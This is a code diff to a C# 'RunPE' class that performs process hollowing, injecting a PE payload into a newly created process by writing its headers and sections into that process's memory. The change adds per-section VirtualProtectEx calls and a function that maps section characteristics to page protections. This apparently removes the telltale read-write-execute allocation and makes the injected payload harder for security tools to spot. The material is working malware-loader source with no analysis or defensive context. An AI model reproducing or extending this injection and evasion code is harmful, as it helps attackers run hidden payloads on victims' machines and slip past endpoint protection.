@@ -67,21 +67,31 @@ public static class RunPE
 
 				IntPtr sizeOfImagePtr = (IntPtr)sizeOfImage;
 				if (NtAllocateVirtualMemory(process, ref imageBase, IntPtr.Zero, ref sizeOfImagePtr, 0x3000, 0x40) < 0 ||
-					NtWriteVirtualMemory(process, imageBase, payload, sizeOfHeaders, IntPtr.Zero) < 0) throw new Exception();
+					NtWriteVirtualMemory(process, imageBase, payload, sizeOfHeaders, IntPtr.Zero) < 0 ||
+					!VirtualProtectEx(process, imageBase, (UIntPtr)sizeOfHeaders, 2, out _)) throw new Exception();
 
 				for (short j = 0; j < numberOfSections; j++)
 				{
 					byte[] section = new byte[0x28];
 					Buffer.BlockCopy(payload, ntHeaders + 0x18 + sizeOfOptionalHeader + j * 0x28, section, 0, 0x28);
 
+					byte[] nextSection = new byte[0x28];
+					if (j < numberOfSections - 1)
+					{
+						Buffer.BlockCopy(payload, ntHeaders + 0x18 + sizeOfOptionalHeader + (j + 1) * 0x28, nextSection, 0, 0x28);
+					}
+
 					int virtualAddress = BitConverter.ToInt32(section, 0xc);
 					int sizeOfRawData = BitConverter.ToInt32(section, 0x10);
 					int pointerToRawData = BitConverter.ToInt32(section, 0x14);
+					uint characteristics = BitConverter.ToUInt32(section, 0x24);
+					int nextSectionVirtualAddress = BitConverter.ToInt32(nextSection, 0xc);
 
 					byte[] rawData = new byte[sizeOfRawData];
 					Buffer.BlockCopy(payload, pointerToRawData, rawData, 0, rawData.Length);
 
 					if (NtWriteVirtualMemory(process, (IntPtr)((long)imageBase + virtualAddress), rawData, rawData.Length, IntPtr.Zero) < 0) throw new Exception();
+					if (!VirtualProtectEx(process, (IntPtr)((long)imageBase + virtualAddress), (UIntPtr)(j == numberOfSections - 1 ? sizeOfImage - virtualAddress : nextSectionVirtualAddress - virtualAddress), SectionCharacteristicsToProtection(characteristics), out _)) throw new Exception();
 				}
 
 				IntPtr thread = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(processInfo, 4) : (IntPtr)BitConverter.ToInt64(processInfo, 8);
@@ -120,7 +130,48 @@ public static class RunPE
 			break;
 		}
 	}
-
+	/// <summary>
+	/// Converts an IMAGE_SECTION_HEADER.Characteristics flag to a memory page protection flag.
+	/// </summary>
+	/// <param name="characteristics">The characteristics of a section.</param>
+	/// <returns>
+	/// A <see cref="uint" /> value to be used with VirtualProtectEx.
+	/// </returns>
+	private static uint SectionCharacteristicsToProtection(uint characteristics)
+	{
+		if ((characteristics & 0x20000000) != 0 && (characteristics & 0x40000000) != 0 && (characteristics & 0x80000000) != 0)
+		{
+			return 0x40;
+		}
+		else if ((characteristics & 0x20000000) != 0 && (characteristics & 0x40000000) != 0)
+		{
+			return 0x20;
+		}
+		else if ((characteristics & 0x20000000) != 0 && (characteristics & 0x80000000) != 0)
+		{
+			return 0x80;
+		}
+		else if ((characteristics & 0x40000000) != 0 && (characteristics & 0x80000000) != 0)
+		{
+			return 0x4;
+		}
+		else if ((characteristics & 0x20000000) != 0)
+		{
+			return 0x10;
+		}
+		else if ((characteristics & 0x40000000) != 0)
+		{
+			return 0x2;
+		}
+		else if ((characteristics & 0x80000000) != 0)
+		{
+			return 0x8;
+		}
+		else
+		{
+			return 0x1;
+		}
+	}
 	/// <summary>
 	/// Allocates memory in the current process with the specified size. If this is a 64-bit process, the memory address is aligned by 16.
 	/// </summary>
@@ -136,6 +187,8 @@ public static class RunPE
 	private static extern IntPtr OpenProcess(int access, bool inheritHandle, int processId);
 	[DllImport("kernel32.dll")]
 	private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, IntPtr startupInfo, byte[] processInformation);
+	[DllImport("kernel32.dll")]
+	private static extern bool VirtualProtectEx(IntPtr process, IntPtr address, UIntPtr size, uint newProtect, out uint oldProtect);
 	[DllImport("ntdll.dll", SetLastError = true)]
 	private static extern int NtAllocateVirtualMemory(IntPtr process, ref IntPtr address, IntPtr zeroBits, ref IntPtr size, uint allocationType, uint protect);
 	[DllImport("ntdll.dll")]
